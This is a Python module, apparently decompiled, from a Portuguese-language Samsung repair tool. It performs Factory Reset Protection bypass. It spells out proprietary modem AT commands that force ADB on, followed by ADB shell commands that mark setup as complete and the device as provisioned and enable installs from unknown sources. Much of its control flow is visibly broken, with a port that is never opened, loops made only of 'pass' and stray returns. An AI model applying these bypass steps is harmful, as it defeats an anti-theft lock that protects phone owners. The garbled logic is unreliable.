'''
­ƒöÑ Samsung Advanced Tools - TECH UNION SOLUTIONS
================================================================================
Funcionalidades avan├ºadas para dispositivos Samsung
Desenvolvido para RESTORECELL
================================================================================
­ƒô▒ FUNCIONALIDADES:
- FRP Bypass por vers├úo Android
- Comando DVIF para informa├º├Áes do dispositivo
- M├®todos validados e testados
ÔÜá´©Å IMPORTANTE: Use apenas em dispositivos pr├│prios ou com autoriza├º├úo
'''
import json
import serial
import serial.tools.list_ports
import time
import re
import logging
import subprocess
from datetime import datetime
from typing import (Optional, Dict, List, Tuple)
import threading
class SamsungAdvancedTools:
    '''Ferramentas avan├ºadas para Samsung'''
    SAMSUNG_VID = '04E8'
    DVIF_COMMAND = 'DVIF'
    def __init__(self, samsung_manager=None, adb_manager=None):
        self.samsung_manager = samsung_manager
        self.adb_manager = adb_manager
        self.serial_port = None
        self.logs = []
        self.logger = logging.getLogger(__name__)
    def add_log(self, message: str, level: str='INFO', category: str='SYSTEM'):
        '''Adiciona mensagem aos logs com categoria - S├ô LOGS INTERNOS'''
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        log_msg = f'[{timestamp}] [{category}] {message}'
        self.logs.append(log_msg)
        if level == 'ERROR':
            self.logger.error(f'[{category}] {message}')
            return
        if level == 'WARNING':
            self.logger.warning(f'[{category}] {message}')
            return
        self.logger.info(f'[{category}] {message}')
    def find_samsung_ports(self) -> List[Dict]:
        '''Encontra todas as portas Samsung dispon├¡veis'''
        try:
            self.add_log('­ƒöì Procurando portas Samsung...', 'INFO', 'PORT_SCAN')
            samsung_ports = []
            for port in serial.tools.list_ports.comports():
                port_info = {'port': port.device, 'description': getattr(port, 'description', 'N/A'), 'vid': getattr(port, 'vid', None), 'pid': getattr(port, 'pid', None), 'type': 'unknown'}
                if port_info['vid'] is not None:
                    vid_hex = f'{port_info['vid']:04X}'
                    if vid_hex == self.SAMSUNG_VID:
                        pid_hex = f'{port_info['pid']:04X}' if port_info['pid'] else '0000'
                        if port_info['pid'] == 26717:
                            port_info['type'] = 'modem'
                        elif port_info['pid'] == 26720:
                            port_info['type'] = 'adb'
                        else:
                            port_info['type'] = 'samsung'
                        samsung_ports.append(port_info)
                        self.add_log(f'Ô£à Porta Samsung: {port.device} (VID {vid_hex}, PID {pid_hex}) - {port_info['type']}', 'INFO', 'PORT_SCAN')
                desc = str(port_info['description']).lower()
                if not any((keyword in desc for keyword in ('samsung', 'mobile', 'modem'))):
                    continue
                if port_info in samsung_ports:
                    continue
                port_info['type'] = 'modem_desc'
                samsung_ports.append(port_info)
                self.add_log(f'Ô£à Porta Samsung (desc): {port.device} - {port_info['description']}', 'INFO', 'PORT_SCAN')
                continue
            self.add_log(f'­ƒôè Total de portas Samsung encontradas: {len(samsung_ports)}', 'INFO', 'PORT_SCAN')
            return samsung_ports
        except Exception as e:
            self.add_log(f'ÔØî Erro na busca de portas: {e}', 'ERROR', 'PORT_SCAN')
            return []
    def connect_to_port(self, port_name: str, baudrate: int=115200) -> bool:
        '''Conecta ├á porta serial - MESMO PADR├âO do validador que funcionou'''
        try:
            self.add_log(f'­ƒöî Conectando ├á {port_name} (modo est├ível)...', 'INFO', 'CONNECTION')
            if self.serial_port:
                pass
            try:
                if self.serial_port.is_open:
                    self.serial_port.close()
                self.add_log('Ô£à Conex├úo anterior fechada', 'INFO', 'CONNECTION')
            except Exception as e:
                self.add_log(f'ÔÜá´©Å Erro fechando porta anterior: {e}', 'WARNING', 'CONNECTION')
            else:
                self.serial_port = None
                time.sleep(2)
                max_tentativas = 3
                for tentativa in range(1, max_tentativas + 1):
                    pass
        except Exception as e:
            self.add_log(f'ÔØî Erro cr├¡tico na conex├úo: {e}', 'ERROR', 'CONNECTION')
            if self.serial_port:
                try:
                    self.serial_port.close()
                except:
                    pass
                self.serial_port = None
        self.add_log(f'ÔØî Falha na conex├úo ap├│s {max_tentativas} tentativas', 'ERROR', 'CONNECTION')
        return False
    def test_at_communication(self) -> bool:
        '''Testa comunica├º├úo AT - MESMO PADR├âO do validador que funcionou'''
        try:
            if not self.serial_port or not self.serial_port.is_open:
                self.add_log('ÔØî Porta serial n├úo est├í aberta', 'ERROR', 'AT_TEST')
                return False
            self.add_log('­ƒöì Testando comunica├º├úo AT (modo est├ível)...', 'INFO', 'AT_TEST')
            test_commands = ['AT', 'ATE0']
            max_tentativas = 3
            for cmd in test_commands:
                for tentativa in range(1, max_tentativas + 1):
                    try:
                        try:
                            self.add_log(f'­ƒöì Testando: {cmd} (tentativa {tentativa})', 'INFO', 'AT_TEST')
                            if not self.serial_port.is_open:
                                self.add_log('ÔØî Porta fechou durante teste AT', 'ERROR', 'AT_TEST')
                                return False
                        except Exception as e:
                            self.add_log(f'ÔØî Erro testando {cmd} (tentativa {tentativa}): {e}', 'ERROR', 'AT_TEST')
                            if tentativa < max_tentativas:
                                time.sleep(1)
                            continue
                    except Exception as e:
                        self.add_log(f'ÔØî Erro cr├¡tico no teste AT: {e}', 'ERROR', 'AT_TEST')
                        return False
                    try:
                        try:
                            success, response = self.send_at_command_stable(cmd, timeout=8.0)
                            if success and response:
                                if 'OK' in response or 'AT' in response or 'ERROR' in response:
                                    self.add_log(f'Ô£à Comunica├º├úo AT estabelecida com {cmd}', 'INFO', 'AT_TEST')
                                    return True
                                self.add_log(f'ÔÜá´©Å Resposta inesperada: {response[:50]}...', 'WARNING', 'AT_TEST')
                            else:
                                self.add_log(f'ÔÜá´©Å Sem resposta para {cmd} (tentativa {tentativa})', 'WARNING', 'AT_TEST')
                        except Exception as e:
                            self.add_log(f'ÔØî Erro testando {cmd} (tentativa {tentativa}): {e}', 'ERROR', 'AT_TEST')
                            if tentativa < max_tentativas:
                                time.sleep(1)
                            continue
                    except Exception as e:
                        self.add_log(f'ÔØî Erro cr├¡tico no teste AT: {e}', 'ERROR', 'AT_TEST')
                        return False
                    if tentativa < max_tentativas:
                        time.sleep(1)
                continue
        except Exception as e:
            self.add_log(f'ÔØî Erro cr├¡tico no teste AT: {e}', 'ERROR', 'AT_TEST')
            return False
        self.add_log('ÔØî Nenhum comando AT respondeu ap├│s todas as tentativas', 'ERROR', 'AT_TEST')
        return False
    def send_at_command_stable(self, command: str, timeout: float=12.0) -> Tuple[bool, str]:
        '''Envia comando AT com tratamento de INSTABILIDADE - IGUAL AO VALIDADOR'''
        try:
            if not self.serial_port or not self.serial_port.is_open:
                self.add_log('ÔØî Porta n├úo est├í aberta para enviar comando', 'ERROR', 'AT_STABLE')
                return (False, 'Porta n├úo conectada')
        except Exception as e:
            self.add_log(f'ÔØî Erro cr├¡tico enviando comando: {e}', 'ERROR', 'AT_STABLE')
            return False, str(e)
        try:
            if not self.serial_port.is_open:
                self.add_log('ÔØî Porta fechou antes de enviar comando', 'ERROR', 'AT_STABLE')
                return (False, 'Porta fechou')
        except Exception as e:
            self.add_log(f'ÔØî Erro verificando status da porta: {e}', 'ERROR', 'AT_STABLE')
            try:
                return False, str(e)
            except Exception as e:
                self.add_log(f'ÔØî Erro cr├¡tico enviando comando: {e}', 'ERROR', 'AT_STABLE')
                return False, str(e)
        try:
            self.serial_port.reset_input_buffer()
            self.serial_port.reset_output_buffer()
        except Exception as e:
            self.add_log(f'ÔÜá´©Å Erro limpando buffers: {e}', 'WARNING', 'AT_STABLE')
        try:
            cmd_bytes = f'{command}\r\n'.encode('ascii')
            self.add_log('­ƒôñ Enviando comando propriet├írio...', 'INFO', 'AT_COMMAND')
            bytes_written = self.serial_port.write(cmd_bytes)
            if bytes_written != len(cmd_bytes):
                self.add_log(f'ÔÜá´©Å Bytes escritos: {bytes_written}/{len(cmd_bytes)}', 'WARNING', 'AT_STABLE')
            self.serial_port.flush()
        except Exception as e:
            self.add_log(f'ÔØî Erro enviando comando: {e}', 'ERROR', 'AT_STABLE')
            try:
                return False, str(e)
            except Exception as e:
                self.add_log(f'ÔØî Erro cr├¡tico enviando comando: {e}', 'ERROR', 'AT_STABLE')
                return False, str(e)
        start_time = time.time()
        buffer = ''
        last_data_time = time.time()
        while time.time() - start_time < timeout:
            try:
                if not self.serial_port.is_open:
                    self.add_log('ÔØî Porta fechou durante aguardo de resposta', 'ERROR', 'AT_STABLE')
                    return (False, 'Porta fechou durante resposta')
                if self.serial_port.in_waiting > 0:
                    chunk = self.serial_port.read(self.serial_port.in_waiting)
                try:
                    chunk_str = chunk.decode('ascii', errors='ignore')
                    buffer += chunk_str
                    last_data_time = time.time()
                except Exception as e:
                    self.add_log(f'ÔÜá´©Å Erro decodificando resposta: {e}', 'WARNING', 'AT_STABLE')
                else:
                    if 'OK' in buffer or 'ERROR' in buffer or '@#' in buffer or len(buffer) > 300:
                        time.sleep(0.8)
            except Exception as e:
                self.add_log(f'ÔØî Erro cr├¡tico enviando comando: {e}', 'ERROR', 'AT_STABLE')
                return False, str(e)
            try:
                try:
                    try:
                        if time.time() - last_data_time > 5.0 and buffer:
                            self.add_log('ÔÜá´©Å Timeout aguardando dados adicionais', 'WARNING', 'AT_STABLE')
                            break
                    except Exception as e:
                        self.add_log(f'ÔØî Erro durante aguardo de resposta: {e}', 'ERROR', 'AT_STABLE')
                        break
                except Exception as e:
                    self.add_log(f'ÔØî Erro durante aguardo de resposta: {e}', 'ERROR', 'AT_STABLE')
                    break
            except Exception as e:
                self.add_log(f'ÔØî Erro cr├¡tico enviando comando: {e}', 'ERROR', 'AT_STABLE')
                return False, str(e)
            try:
                try:
                    time.sleep(0.02)
                except Exception as e:
                    self.add_log(f'ÔØî Erro durante aguardo de resposta: {e}', 'ERROR', 'AT_STABLE')
                    break
            except Exception as e:
                self.add_log(f'ÔØî Erro cr├¡tico enviando comando: {e}', 'ERROR', 'AT_STABLE')
                return False, str(e)
        try:
            response = buffer.strip() if buffer.strip() else ''
            if response:
                if '@#' in buffer:
                    self.add_log('­ƒôÑ Resposta: Informa├º├Áes do dispositivo obtidas', 'INFO', 'AT_COMMAND')
                else:
                    self.add_log('­ƒôÑ Resposta: Comando processado', 'INFO', 'AT_COMMAND')
                return True, response
            self.add_log('ÔÜá´©Å Sem resposta do dispositivo', 'WARNING', 'AT_STABLE')
        except Exception as e:
            self.add_log(f'ÔØî Erro cr├¡tico enviando comando: {e}', 'ERROR', 'AT_STABLE')
            return False, str(e)
        return (False, 'Sem resposta')
    def send_at_command(self, command: str, timeout: float=3.0) -> Tuple[bool, str]:
        '''Envia comando AT e retorna resposta - USA M├ëTODO EST├üVEL'''
        return self.send_at_command_stable(command, timeout)
    def connect_to_port_direct_dvif(self, port_name: str) -> bool:
        '''Conecta DIRETO para DVIF (sem teste AT) - baseado no script que funciona'''
        try:
            self.add_log(f'­ƒöî Conectando DIRETO ao MODEM: {port_name}', 'INFO', 'DVIF_DIRECT')
            if self.serial_port:
                pass
            try:
                if self.serial_port.is_open:
                    self.serial_port.close()
            except:
                pass
            else:
                self.serial_port = None
                time.sleep(1.0)
                self.serial_port = serial.Serial(port=port_name, baudrate=115200, timeout=2.0, write_timeout=3.0, bytesize=serial.EIGHTBITS, parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE)
                time.sleep(1.0)
                self.serial_port.reset_input_buffer()
                self.serial_port.reset_output_buffer()
                self.add_log('Ô£à Conectado DIRETO ao MODEM Samsung', 'INFO', 'DVIF_DIRECT')
                init_commands = ['AT', 'ATZ', 'ATE0']
                for cmd in init_commands:
                    pass
        except Exception as e:
            self.add_log(f'ÔØî Erro conex├úo DVIF direto: {e}', 'ERROR', 'DVIF_DIRECT')
            return False
        return True
    def send_dvif_direct(self) -> Optional[str]:
        '''Envia comando DVIF DIRETO - baseado no script que funciona'''
        try:
            if not self.serial_port or not self.serial_port.is_open:
                return
            self.add_log('­ƒô▒ Enviando comando DVIF (AT direto)...', 'INFO', 'DVIF_DIRECT')
            self.serial_port.reset_input_buffer()
            formats = [f'{self.DVIF_COMMAND}\r\n', f'{self.DVIF_COMMAND}\r', f'{self.DVIF_COMMAND}\n', f'{self.DVIF_COMMAND}', f'AT+{self.DVIF_COMMAND}\r\n']
            for i, cmd_format in enumerate(formats):
                self.add_log(f"­ƒôñ Tentativa {i + 1}: '{cmd_format.strip()}'", 'DEBUG', 'DVIF_DIRECT')
                self.serial_port.reset_input_buffer()
                self.serial_port.write(cmd_format.encode('ascii'))
                start_time = time.time()
                buffer = ''
                while time.time() - start_time < 3.0:
                    if self.serial_port.in_waiting > 0:
                        chunk = self.serial_port.read(self.serial_port.in_waiting)
                        try:
                            try:
                                chunk_str = chunk.decode('ascii', errors='ignore')
                                buffer += chunk_str
                                if '@#' in buffer:
                                    time.sleep(0.5)
                                    if self.serial_port.in_waiting > 0:
                                        extra = self.serial_port.read(self.serial_port.in_waiting)
                                        buffer += extra.decode('ascii', errors='ignore')
                                    self.add_log('­ƒôÑ Resposta DVIF obtida com sucesso', 'INFO', 'DVIF_DIRECT')
                                    return buffer
                            except Exception as e:
                                self.add_log(f'ÔÜá´©Å Erro decodifica├º├úo: {e}', 'WARNING', 'DVIF_DIRECT')
                        except Exception as e:
                            self.add_log(f'ÔØî Erro comando DVIF direto: {e}', 'ERROR', 'DVIF_DIRECT')
                    time.sleep(0.01)
                if buffer.strip():
                    self.add_log(f'­ƒôÑ Resposta tentativa {i + 1}: dados recebidos', 'DEBUG', 'DVIF_DIRECT')
                    if '@#' in buffer:
                        return buffer
                else:
                    self.add_log(f'ÔØî Tentativa {i + 1}: sem resposta', 'DEBUG', 'DVIF_DIRECT')
                time.sleep(0.5)
                continue
        except Exception as e:
            self.add_log(f'ÔØî Erro comando DVIF direto: {e}', 'ERROR', 'DVIF_DIRECT')
        self.add_log('ÔØî Todas as tentativas de DVIF falharam', 'ERROR', 'DVIF_DIRECT')
    def execute_dvif_command(self) -> Dict:
        '''Executa comando DVIF DIRETO (sem teste AT) - baseado no m├®todo que funciona'''
        result = {'success': False, 'data': {}, 'raw': '', 'error': '', 'method': 'DVIF AT Command Direct'}
        try:
            self.add_log('­ƒöÑ Iniciando comando DVIF direto...', 'INFO', 'DVIF')
            ports = self.find_samsung_ports()
            if not ports:
                result['error'] = 'Nenhuma porta Samsung encontrada'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro no comando DVIF: {e}', 'ERROR', 'DVIF')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            target_port = ports[0]['port']
            self.add_log(f'­ƒÄ» Usando porta: {target_port}', 'INFO', 'DVIF')
            if not self.connect_to_port_direct_dvif(target_port):
                result['error'] = f'Falha na conex├úo direta com {target_port}'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro no comando DVIF: {e}', 'ERROR', 'DVIF')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            response = self.send_dvif_direct()
            if not response:
                result['error'] = 'Comando DVIF n├úo retornou resposta v├ílida'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro no comando DVIF: {e}', 'ERROR', 'DVIF')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            if '@#' not in response:
                result['error'] = 'Resposta inv├ílida do comando DVIF'
                result['raw'] = 'Resposta protegida'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro no comando DVIF: {e}', 'ERROR', 'DVIF')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            parsed_data = self.parse_dvif_response(response)
            if not parsed_data:
                result['error'] = 'N├úo foi poss├¡vel processar resposta DVIF'
                result['raw'] = 'Resposta protegida'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro no comando DVIF: {e}', 'ERROR', 'DVIF')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            result['success'] = True
            result['data'] = parsed_data
            result['raw'] = 'Dados protegidos - informa├º├Áes obtidas com sucesso'
            self.add_log('Ô£à Comando DVIF executado com sucesso', 'INFO', 'DVIF')
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro no comando DVIF: {e}', 'ERROR', 'DVIF')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        if self.serial_port:
            if self.serial_port.is_open:
                self.serial_port.close()
                return result
    def parse_dvif_response(self, response: str) -> Dict:
        '''Parse da resposta do comando propriet├írio'''
        try:
            self.add_log('­ƒöì Processando informa├º├Áes do dispositivo...', 'INFO', 'DEVICE_PARSE')
            blocks = re.findall('@#(.*?)@#', response)
            if not blocks:
                self.add_log('ÔØî Formato de resposta inv├ílido', 'ERROR', 'DEVICE_PARSE')
                return {}
            parsed_data = {}
            for block in blocks:
                pairs = block.split(';')
                for pair in pairs:
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        key = key.strip().lower()
                        value = value.strip()
                        if not key:
                            continue
                        if value:
                            parsed_data[key] = value
            parsed_data['protocol'] = 'Comando_Proprietario_Samsung'
            parsed_data['timestamp'] = datetime.now().isoformat()
            self.add_log(f'Ô£à Processamento conclu├¡do: {len(parsed_data)} campos', 'INFO', 'DEVICE_PARSE')
            return parsed_data
        except Exception as e:
            self.add_log(f'ÔØî Erro no processamento: {e}', 'ERROR', 'DEVICE_PARSE')
            return {}
    def execute_frp_android_9_10(self) -> Dict:
        '''Executa FRP Bypass para Android 9-10 (Pre-Aug2022)'''
        result = {'success': False, 'method': 'FRP Android 9-10 (Pre-Aug2022)', 'commands_executed': [], 'adb_activated': False, 'error': ''}
        try:
            self.add_log('­ƒöô Iniciando FRP Bypass Android 9-10...', 'INFO', 'FRP_9_10')
            ports = self.find_samsung_ports()
            if not ports:
                result['error'] = 'Nenhuma porta Samsung encontrada'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro FRP 9-10: {e}', 'ERROR', 'FRP_9_10')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            target_port = ports[0]['port']
            self.add_log(f'­ƒÄ» Conectando ├á porta Samsung: {target_port}', 'INFO', 'FRP_9_10')
            if not self.connect_to_port(target_port):
                result['error'] = f'Falha na conex├úo com {target_port}'
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro FRP 9-10: {e}', 'ERROR', 'FRP_9_10')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        try:
            frp_commands = [('CMD_PROP_1', 'Controle de dump'), ('CMD_PROP_2', 'N├¡vel de debug'), ('CMD_PROP_3', 'Desbloquear modem Samsung'), ('CMD_PROP_4', 'Ativar modem'), ('CMD_PROP_5', 'Rebloquear modem'), ('CMD_PROP_6', 'Re-configurar debug')]
            cmd_map = {'CMD_PROP_1': 'AT+DUMPCTRL=1,0', 'CMD_PROP_2': 'AT+DEBUGLVC=0,5', 'CMD_PROP_3': 'AT+SWATD=0', 'CMD_PROP_4': 'AT+ACTIVATE=0,0,0', 'CMD_PROP_5': 'AT+SWATD=1', 'CMD_PROP_6': 'AT+DEBUGLVC=0,5'}
            self.add_log(f'­ƒôï Executando {len(frp_commands)} comandos AT...', 'INFO', 'FRP_9_10')
            for i, (cmd, desc) in enumerate(frp_commands, 1):
                self.add_log(f'ÔÜí [{i}/{len(frp_commands)}] {desc}...', 'INFO', 'FRP_9_10')
                real_cmd = cmd_map.get(cmd, cmd)
                success, response = self.send_at_command_stable(real_cmd, 8.0)
                cmd_result = {'command': cmd, 'description': desc, 'success': success, 'response': response}
                result['commands_executed'].append(cmd_result)
                if not success and ('Acesso negado' in response or 'PermissionError' in response or 'WriteFile failed' in response):
                    self.add_log(f'­ƒÜ¿ ACESSO NEGADO detectado no comando: {desc}', 'WARNING', 'FRP_9_10')
                    self.add_log('­ƒöä INTERVEN├ç├âO NECESS├üRIA - Igual ao validador que funcionou!', 'INFO', 'FRP_9_10')
                    result['requires_usb_reconnection'] = True
                    result['failed_at_command'] = i
                    result['failed_command_desc'] = desc
                    result['reconnection_message'] = f'­ƒÜ¿ ACESSO NEGADO detectado no comando {i}/{len(frp_commands)}: {desc}\n\n­ƒôï PROCEDIMENTO NECESS├üRIO (igual ao validador que funcionou):\n\n1. ­ƒöî DESCONECTE o cabo USB do dispositivo\n2. ÔÅ│ Aguarde 3 segundos\n3. ­ƒöî RECONECTE o cabo USB\n4. ­ƒô▒ VERIFIQUE a tela do dispositivo\n5. Ô£à Se aparecer solicita├º├úo de AUTORIZA├ç├âO USB DEBUGGING, ACEITE\n6. ­ƒÄ» Clique SIM para continuar o processo ADB\n\nÔÜá´©Å Este procedimento ├® CR├ìTICO para o sucesso do FRP bypass!'
                    self.add_log('ÔÅ©´©Å Execu├º├úo pausada - aguardando interven├º├úo do usu├írio', 'INFO', 'FRP_9_10')
                    result
                    if self.serial_port:
                        if self.serial_port.is_open:
                            self.serial_port.close()
                            return
                        return
                    return
                if success and ('OK' in response or 'ACTIVATE' in response or 'DEBUGLVC' in response):
                    self.add_log(f'Ô£à {desc}: Sucesso', 'INFO', 'FRP_9_10')
                else:
                    self.add_log(f'ÔÜá´©Å {desc}: {response}', 'WARNING', 'FRP_9_10')
                time.sleep(0.5)
                continue
        except Exception as e:
            result['error'] = f'Erro inesperado: {e}'
            self.add_log(f'ÔØî Erro FRP 9-10: {e}', 'ERROR', 'FRP_9_10')
            try:
                return result
            finally:
                if self.serial_port:
                    if self.serial_port.is_open:
                        self.serial_port.close()
            return self
        self.add_log('­ƒöì Verificando ativa├º├úo do ADB...', 'INFO', 'FRP_9_10')
        time.sleep(3)
        adb_active = self.check_adb_status()
        result['adb_activated'] = adb_active
        if adb_active:
            self.add_log('­ƒÄë ADB ATIVADO! Executando bypass final...', 'INFO', 'FRP_9_10')
            adb_commands = ['shell settings put global setup_wizard_has_run 1', 'shell settings put secure user_setup_complete 1', 'shell content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1', 'shell am start -c android.intent.category.HOME -a android.intent.action.MAIN']
            for adb_cmd in adb_commands:
                pass
            result['success'] = True
            self.add_log('­ƒÄë FRP BYPASS ANDROID 9-10 CONCLU├ìDO!', 'INFO', 'FRP_9_10')
        else:
            result['error'] = 'ADB n├úo foi ativado ap├│s sequ├¬ncia de tentativas...'
            self.add_log('ÔØî ADB n├úo ativado. Verifique se o dispositivo est├í no menu *#0*#', 'ERROR', 'FRP_9_10')
        if self.serial_port:
            if self.serial_port.is_open:
                self.serial_port.close()
                return result
    def continue_frp_with_adb(self, previous_result: Dict) -> Dict:
        '''Continua FRP bypass com comandos ADB ap├│s interven├º├úo do usu├írio'''
        result = {'success': False, 'method': 'FRP Android 9-10 (Continua├º├úo ADB)', 'adb_commands_executed': [], 'error': ''}
        import platform
        si = None
        cf = 0
        if platform.system() == 'Windows':
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            cf = subprocess.CREATE_NO_WINDOW
        try:
            self.add_log('­ƒöä Continuando FRP bypass com comandos ADB...', 'INFO', 'ADB_CONTINUATION')
            time.sleep(2.0)
            self.add_log('­ƒöì Verificando ativa├º├úo do ADB ap├│s interven├º├úo...', 'INFO', 'ADB_CONTINUATION')
            if not self.check_adb_status():
                result['error'] = 'ADB n├úo foi ativado ap├│s interven├º├úo. Verifique se aceitou a autoriza├º├úo USB Debugging.'
                return result
            self.add_log('Ô£à ADB ativado com sucesso!', 'INFO', 'ADB_CONTINUATION')
            self.add_log('ÔÅ│ Aguardando dispositivo autorizar ADB...', 'INFO', 'ADB_CONTINUATION')
            max_wait = 10
            for wait_attempt in range(max_wait):
                pass
            try:
                import platform
                if platform.system() == 'Windows':
                    result_check = subprocess.run([self.adb_manager.adb_path, 'devices'], capture_output=True, text=True, timeout=5, startupinfo=self.adb_manager.startupinfo, creationflags=self.adb_manager.creation_flags)
                else:
                    result_check = subprocess.run([self.adb_manager.adb_path, 'devices'], capture_output=True, text=True, timeout=5)
                if result_check.returncode == 0:
                    devices_output = result_check.stdout.strip()
                    if 'device' in devices_output and 'connecting' not in devices_output:
                        self.add_log('Ô£à Dispositivo autorizado e pronto!', 'INFO', 'ADB_CONTINUATION')
            except Exception as e:
                self.add_log(f'ÔÜá´©Å Erro verificando status: {str(e)[:30]}...', 'WARNING', 'ADB_CONTINUATION')
        except Exception as e:
            self.add_log(f'ÔØî Erro cr├¡tico na continua├º├úo ADB: {e}', 'ERROR', 'ADB_CONTINUATION')
            result['error'] = f'Erro cr├¡tico: {str(e)}'
            return result
        self.add_log("ÔÜá´©Å Dispositivo ainda em 'connecting' - continuando mesmo assim", 'WARNING', 'ADB_CONTINUATION')
        adb_commands = [('shell settings put global setup_wizard_has_run 1', 'Marcar assistente de configura├º├úo como conclu├¡do'), ('shell settings put secure user_setup_complete 1', 'Marcar configura├º├úo do usu├írio como completa'), ('shell content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1', 'Marcar dispositivo como provisionado'), ('shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1', 'Confirmar configura├º├úo do usu├írio'), ('shell content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1', 'Permitir instala├º├úo de apps de fontes desconhecidas'), ('shell am start -c android.intent.category.HOME -a android.intent.action.MAIN', 'Iniciar tela inicial')]
        self.add_log(f'­ƒôï Executando {len(adb_commands)} comandos ADB...', 'INFO', 'ADB_CONTINUATION')
        success_count = 0
        for i, (cmd, desc) in enumerate(adb_commands, 1):
            self.add_log(f'ÔÜí [{i}/{len(adb_commands)}] {desc}...', 'INFO', 'ADB_CONTINUATION')
            try:
                if self.adb_manager and hasattr(self.adb_manager, 'execute_adb_command'):
                    pass
                try:
                    adb_output = self.adb_manager.execute_adb_command(cmd, timeout=10)
                    process_result = type('Result', (), {'returncode': 0 if adb_output and 'error:' not in str(adb_output).lower() else 1, 'stdout': str(adb_output) if adb_output else '', 'stderr': str(adb_output) if adb_output and 'error:' in str(adb_output).lower() else ''})()
                    self.add_log(f'Ô£à Comando executado via ADBManager UNION: {cmd[:30]}...', 'DEBUG', 'ADB_CONTINUATION')
                except Exception as e:
                    self.add_log(f'ÔÜá´©Å Falha ADBManager UNION, tentando PATH: {str(e)[:30]}...', 'WARNING', 'ADB_CONTINUATION')
                    process_result = subprocess.run(f'adb {cmd}', shell=True, capture_output=True, text=True, timeout=10, startupinfo=si, creationflags=cf)
                else:
                    process_result = subprocess.run(f'adb {cmd}', shell=True, capture_output=True, text=True, timeout=10, startupinfo=si, creationflags=cf)
                    adb_result = {'command': cmd, 'description': desc, 'success': process_result.returncode == 0, 'output': process_result.stdout.strip() if process_result.stdout else '', 'error': process_result.stderr.strip() if process_result.stderr else ''}
                    result['adb_commands_executed'].append(adb_result)
                    if process_result.returncode == 0:
                        success_count += 1
                        self.add_log(f'Ô£à {desc}: Sucesso', 'INFO', 'ADB_CONTINUATION')
                    else:
                        self.add_log(f'ÔÜá´©Å {desc}: {process_result.stderr or 'Erro desconhecido'}', 'WARNING', 'ADB_CONTINUATION')
                    time.sleep(1)
            except subprocess.TimeoutExpired:
                self.add_log(f'ÔÅ░ {desc}: Timeout', 'WARNING', 'ADB_CONTINUATION')
                adb_result = {'command': cmd, 'description': desc, 'success': False, 'output': '', 'error': 'Timeout'}
                result['adb_commands_executed'].append(adb_result)
            continue
        success_rate = success_count / len(adb_commands)
        if success_rate >= 0.8:
            result['success'] = True
            self.add_log(f'­ƒÄë FRP bypass conclu├¡do com sucesso! ({success_count}/{len(adb_commands)} comandos)', 'INFO', 'ADB_CONTINUATION')
            return result
        result['error'] = f'Muitos comandos ADB falharam ({success_count}/{len(adb_commands)} sucessos)'
        self.add_log(f'ÔÜá´©Å FRP bypass parcialmente executado: {success_count}/{len(adb_commands)}', 'WARNING', 'ADB_CONTINUATION')
        return result
    def continue_frp_android_11_plus_with_adb(self, previous_result: Dict) -> Dict:
        '''Continua FRP Android 11+ com comandos ADB ap├│s interven├º├úo do usu├írio'''
        result = {'success': False, 'method': 'FRP Android 11+ (Continua├º├úo ADB)', 'adb_commands_executed': [], 'error': ''}
        import platform
        si = None
        cf = 0
        if platform.system() == 'Windows':
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            cf = subprocess.CREATE_NO_WINDOW
        try:
            self.add_log('­ƒöä Continuando FRP Android 11+ com comandos ADB...', 'INFO', 'ADB_CONTINUATION_11_PLUS')
            time.sleep(2.0)
            self.add_log('­ƒöì Verificando ativa├º├úo do ADB ap├│s interven├º├úo...', 'INFO', 'ADB_CONTINUATION_11_PLUS')
